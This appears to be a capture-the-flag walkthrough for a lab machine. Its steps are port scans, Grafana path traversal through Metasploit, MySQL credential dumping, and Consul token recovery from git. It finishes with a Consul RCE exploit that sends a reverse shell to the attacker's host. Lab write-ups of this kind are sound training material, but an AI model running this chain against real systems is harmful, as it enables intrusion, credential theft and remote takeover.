@@ -1,0 +1,348 @@
+ip : 10.10.11.183
+
+rustscan:
+PORT     STATE SERVICE REASON
+22/tcp   open  ssh     syn-ack
+80/tcp   open  http    syn-ack
+3000/tcp open  ppp     syn-ack
+3306/tcp open  mysql   syn-ack
+
+nmap: with script=vuln
+PORT     STATE SERVICE REASON  VERSION
+22/tcp   open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| vulners: 
+|   cpe:/a:openbsd:openssh:8.2p1: 
+|       CVE-2020-15778  6.8     https://vulners.com/cve/CVE-2020-15778
+|       C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3    6.8     https://vulners.com/githubexploit/C94132FD-1FA5-5342-B6EE-0DAF45EEFFE3  *EXPLOIT*
+|       10213DBE-F683-58BB-B6D3-353173626207    6.8     https://vulners.com/githubexploit/10213DBE-F683-58BB-B6D3-353173626207  *EXPLOIT*
+|       CVE-2020-12062  5.0     https://vulners.com/cve/CVE-2020-12062
+|       CVE-2021-28041  4.6     https://vulners.com/cve/CVE-2021-28041
+|       CVE-2021-41617  4.4     https://vulners.com/cve/CVE-2021-41617
+|       CVE-2020-14145  4.3     https://vulners.com/cve/CVE-2020-14145
+|       CVE-2016-20012  4.3     https://vulners.com/cve/CVE-2016-20012
+|_      CVE-2021-36368  2.6     https://vulners.com/cve/CVE-2021-36368
+80/tcp   open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+| http-enum: 
+|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
+| http-internal-ip-disclosure: 
+|_  Internal IP Leaked: 127.0.1.1
+|_http-jsonp-detection: Couldn't find any JSONP endpoints.
+|_http-litespeed-sourcecode-download: Request with null byte did not work. This web server might not be vulnerable
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+|_http-wordpress-users: [Error] Wordpress installation was not found. We couldn't find wp-login.php
+| vulners: 
+|   cpe:/a:apache:http_server:2.4.41: 
+|       CVE-2022-31813  7.5     https://vulners.com/cve/CVE-2022-31813
+|       CVE-2022-23943  7.5     https://vulners.com/cve/CVE-2022-23943
+|       CVE-2022-22720  7.5     https://vulners.com/cve/CVE-2022-22720
+|       CVE-2021-44790  7.5     https://vulners.com/cve/CVE-2021-44790
+|       CVE-2021-39275  7.5     https://vulners.com/cve/CVE-2021-39275
+|       CVE-2021-26691  7.5     https://vulners.com/cve/CVE-2021-26691
+|       CVE-2020-11984  7.5     https://vulners.com/cve/CVE-2020-11984
+|       CNVD-2022-73123 7.5     https://vulners.com/cnvd/CNVD-2022-73123
+|       CNVD-2022-03225 7.5     https://vulners.com/cnvd/CNVD-2022-03225
+|       CNVD-2021-102386        7.5     https://vulners.com/cnvd/CNVD-2021-102386
+|       1337DAY-ID-34882        7.5     https://vulners.com/zdt/1337DAY-ID-34882        *EXPLOIT*
+|       FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8    6.8     https://vulners.com/githubexploit/FDF3DFA1-ED74-5EE2-BF5C-BA752CA34AE8  *EXPLOIT*
+|       CVE-2021-40438  6.8     https://vulners.com/cve/CVE-2021-40438
+|       CVE-2020-35452  6.8     https://vulners.com/cve/CVE-2020-35452
+|       CNVD-2022-03224 6.8     https://vulners.com/cnvd/CNVD-2022-03224
+|       8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2    6.8     https://vulners.com/githubexploit/8AFB43C5-ABD4-52AD-BB19-24D7884FF2A2  *EXPLOIT*
+|       4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332    6.8     https://vulners.com/githubexploit/4810E2D9-AC5F-5B08-BFB3-DDAFA2F63332  *EXPLOIT*
+|       4373C92A-2755-5538-9C91-0469C995AA9B    6.8     https://vulners.com/githubexploit/4373C92A-2755-5538-9C91-0469C995AA9B  *EXPLOIT*
+|       0095E929-7573-5E4A-A7FA-F6598A35E8DE    6.8     https://vulners.com/githubexploit/0095E929-7573-5E4A-A7FA-F6598A35E8DE  *EXPLOIT*
+|       CVE-2022-28615  6.4     https://vulners.com/cve/CVE-2022-28615
+|       CVE-2021-44224  6.4     https://vulners.com/cve/CVE-2021-44224
+|       CVE-2022-22721  5.8     https://vulners.com/cve/CVE-2022-22721
+|       CVE-2020-1927   5.8     https://vulners.com/cve/CVE-2020-1927
+|       CVE-2022-30556  5.0     https://vulners.com/cve/CVE-2022-30556
+|       CVE-2022-29404  5.0     https://vulners.com/cve/CVE-2022-29404
+|       CVE-2022-28614  5.0     https://vulners.com/cve/CVE-2022-28614
+|       CVE-2022-26377  5.0     https://vulners.com/cve/CVE-2022-26377
+|       CVE-2022-22719  5.0     https://vulners.com/cve/CVE-2022-22719
+|       CVE-2021-36160  5.0     https://vulners.com/cve/CVE-2021-36160
+|       CVE-2021-34798  5.0     https://vulners.com/cve/CVE-2021-34798
+|       CVE-2021-33193  5.0     https://vulners.com/cve/CVE-2021-33193
+|       CVE-2021-30641  5.0     https://vulners.com/cve/CVE-2021-30641
+|       CVE-2021-26690  5.0     https://vulners.com/cve/CVE-2021-26690
+|       CVE-2020-9490   5.0     https://vulners.com/cve/CVE-2020-9490
+|       CVE-2020-1934   5.0     https://vulners.com/cve/CVE-2020-1934
+|       CVE-2020-13950  5.0     https://vulners.com/cve/CVE-2020-13950
+|       CVE-2019-17567  5.0     https://vulners.com/cve/CVE-2019-17567
+|       CNVD-2022-73122 5.0     https://vulners.com/cnvd/CNVD-2022-73122
+|       CNVD-2022-53584 5.0     https://vulners.com/cnvd/CNVD-2022-53584
+|       CNVD-2022-53582 5.0     https://vulners.com/cnvd/CNVD-2022-53582
+|       CNVD-2022-03223 5.0     https://vulners.com/cnvd/CNVD-2022-03223
+|       CVE-2020-11993  4.3     https://vulners.com/cve/CVE-2020-11993
+|_      1337DAY-ID-35422        4.3     https://vulners.com/zdt/1337DAY-ID-35422        *EXPLOIT*
+3000/tcp open  ppp?    syn-ack
+| fingerprint-strings: 
+|   FourOhFourRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity.txt%252ebak; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Tue, 10 Jan 2023 14:36:29 GMT
+|     Content-Length: 29
+|     href="/login">Found</a>.
+|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
+|     HTTP/1.1 400 Bad Request
+|     Content-Type: text/plain; charset=utf-8
+|     Connection: close
+|     Request
+|   GetRequest: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Content-Type: text/html; charset=utf-8
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Tue, 10 Jan 2023 14:35:57 GMT
+|     Content-Length: 29
+|     href="/login">Found</a>.
+|   HTTPOptions: 
+|     HTTP/1.0 302 Found
+|     Cache-Control: no-cache
+|     Expires: -1
+|     Location: /login
+|     Pragma: no-cache
+|     Set-Cookie: redirect_to=%2F; Path=/; HttpOnly; SameSite=Lax
+|     X-Content-Type-Options: nosniff
+|     X-Frame-Options: deny
+|     X-Xss-Protection: 1; mode=block
+|     Date: Tue, 10 Jan 2023 14:36:03 GMT
+|_    Content-Length: 0
+3306/tcp open  mysql   syn-ack MySQL 8.0.30-0ubuntu0.20.04.2
+|_mysql-vuln-cve2012-2122: ERROR: Script execution failed (use -d to debug)
+|_ssl-ccs-injection: ERROR: Script execution failed (use -d to debug)
+|_ssl-dh-params: ERROR: Script execution failed (use -d to debug)
+|_ssl-heartbleed: ERROR: Script execution failed (use -d to debug)
+|_ssl-poodle: ERROR: Script execution failed (use -d to debug)
+|_sslv2-drown: 
+| vulners: 
+|   MySQL 8.0.30-0ubuntu0.20.04.2: 
+|_      NODEJS:602      0.0     https://vulners.com/nodejs/NODEJS:602
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port3000-TCP:V=7.91%I=7%D=1/10%Time=63BD77CC%P=x86_64-pc-linux-gnu%r(Ge
+SF:nericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
+SF:ext/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x
+SF:20Request")%r(GetRequest,174,"HTTP/1\.0\x20302\x20Found\r\nCache-Contro
+SF:l:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nExpir
+SF:es:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\r\nSet-Cookie:\
+SF:x20redirect_to=%2F;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Conten
+SF:t-Type-Options:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protect
+SF:ion:\x201;\x20mode=block\r\nDate:\x20Tue,\x2010\x20Jan\x202023\x2014:35
+SF::57\x20GMT\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found<
+SF:/a>\.\n\n")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+SF:x20Bad\x20Request")%r(HTTPOptions,12E,"HTTP/1\.0\x20302\x20Found\r\nCac
+SF:he-Control:\x20no-cache\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPra
+SF:gma:\x20no-cache\r\nSet-Cookie:\x20redirect_to=%2F;\x20Path=/;\x20HttpO
+SF:nly;\x20SameSite=Lax\r\nX-Content-Type-Options:\x20nosniff\r\nX-Frame-O
+SF:ptions:\x20deny\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Tu
+SF:e,\x2010\x20Jan\x202023\x2014:36:03\x20GMT\r\nContent-Length:\x200\r\n\
+SF:r\n")%r(RTSPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-T
+SF:ype:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400
+SF:\x20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Req
+SF:uest\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x2
+SF:0close\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1
+SF:\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSess
+SF:ionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/
+SF:plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Re
+SF:quest")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Ty
+SF:pe:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\
+SF:x20Bad\x20Request")%r(FourOhFourRequest,1A1,"HTTP/1\.0\x20302\x20Found\
+SF:r\nCache-Control:\x20no-cache\r\nContent-Type:\x20text/html;\x20charset
+SF:=utf-8\r\nExpires:\x20-1\r\nLocation:\x20/login\r\nPragma:\x20no-cache\
+SF:r\nSet-Cookie:\x20redirect_to=%2Fnice%2520ports%252C%2FTri%256Eity\.txt
+SF:%252ebak;\x20Path=/;\x20HttpOnly;\x20SameSite=Lax\r\nX-Content-Type-Opt
+SF:ions:\x20nosniff\r\nX-Frame-Options:\x20deny\r\nX-Xss-Protection:\x201;
+SF:\x20mode=block\r\nDate:\x20Tue,\x2010\x20Jan\x202023\x2014:36:29\x20GMT
+SF:\r\nContent-Length:\x2029\r\n\r\n<a\x20href=\"/login\">Found</a>\.\n\n"
+SF:);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+
+gobuster:
+
+/.hta (Status: 403)
+/.hta.php (Status: 403)
+/.hta.txt (Status: 403)
+/.hta.html (Status: 403)
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.txt (Status: 403)
+/.htaccess.html (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.txt (Status: 403)
+/.htpasswd.html (Status: 403)
+/404.html (Status: 200)
+/categories (Status: 301)
+/images (Status: 301)
+/index.html (Status: 200)
+/index.html (Status: 200)
+/posts (Status: 301)
+/server-status (Status: 403)
+/sitemap.xml (Status: 200)
+/tags (Status: 301)
+
+
+
+Visiting the website on port 80 we found the following info:
+Connecting to this machine
+
+Use the developer account to SSH, DevOps will give you the password.
+
+navigating to 10.10.11.183:3000 we reach Grafana log in
+Grafana version v8.2.0 (d7f71e9eae)
+
+use msfconsole module
+
+msf6 auxiliary(scanner/http/grafana_plugin_traversal) > show options
+check the loot file :
+
+# default admin user, created on startup
+;admin_user = admin
+
+# default admin password, can be changed before first start of grafana,  or in profile settings
+admin_password = messageInABottle685427
+
+log in to grafana using credentials ^
+
+check the mysql username: grafana
+
+msf6 auxiliary(scanner/http/grafana_plugin_traversal) > show options
+
+set FILEPATH: /var/lib/grafana/grafana.db
+
+open the db with sqlite
+
+run the query: select * from data_source
+
+dontStandSoCloseToMe63221!
+
+using grafana dontStandSoCloseToMe63221! log in to mysql
+mysql -u grafana -p'dontStandSoCloseToMe63221!' -h 10.10.11.183 -P 3306                                                                                                                      1 ⨯
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MySQL connection id is 233
+Server version: 8.0.30-0ubuntu0.20.04.2 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]> 
+MySQL [(none)]> show databases;
++--------------------+
+| Database           |
++--------------------+
+| grafana            |
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| whackywidget       |
++--------------------+
+ySQL [(none)]> use whackywidget
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MySQL [whackywidget]> show tables
+    -> ;
++------------------------+
+| Tables_in_whackywidget |
++------------------------+
+| users                  |
++------------------------+
+MySQL [whackywidget]> select * from users;
++-----------+------------------------------------------+
+| user      | pass                                     |
++-----------+------------------------------------------+
+| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
++-----------+------------------------------------------+
+1 row in set (0.055 sec)
+
+decode the base64 pass:
+echo "YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg==" | base64 -d
+anEnglishManInNewYork027468
+
+ssh to 10.10.11.183 using developer and pass ^
+
+user flag: 88bfb6cb005ba48f86da34836be2df9c
+
+PRIVESC:
+cd /opt/my-app
+
+-bash-5.0$ git log
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+commit c982db8eff6f10f8f3a7d802f79f2705e7a21b55
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:44:45 2022 +0000
+
+    config script
+
+commit 8dce6570187fd1dcfb127f51f147cd1ca8dc01c6
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 22:47:01 2022 +0000
+
+    created project with django CLI
+
+commit 4b8597b167b2fbf8ec35f992224e612bf28d9e51
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 22:44:11 2022 +0000
+
+    .gitignore
+-bash-5.0$ git show 33a53ef9a207976d5ceceddc41a199558843bf3c
+commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
+Author: Developer <developer@ambassador.local>
+Date:   Sun Mar 13 23:47:36 2022 +0000
+
+    tidy config script
+
+diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
+index 35c08f6..fc51ec0 100755
+--- a/whackywidget/put-config-in-consul.sh
++++ b/whackywidget/put-config-in-consul.sh
+@@ -1,4 +1,4 @@
+ # We use Consul for application config in production, this script will help set the correct values for the app
+-# Export MYSQL_PASSWORD before running
++# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running
+ 
+-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
++consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
+
+
+consul is used :-> https://github.com/GatoGamer1155/Hashicorp-Consul-RCE-via-API
+
+get the exploit to the local machine
+copy the exploit to the victim machine(tmp file)
+
+set up listener on local machine
+
+run the exploit:(token is found in the commit above ^)
+-bash-5.0$ python3 exploit.py --rhost 127.0.0.1 --rport 8500 --lhost 10.10.14.93 --lport 4444 --token bb03b43b-1d81-d62b-24b5-39540ee469b5
+
+root flag: dbd7570bb9c6a3f05aa1824e608a107e
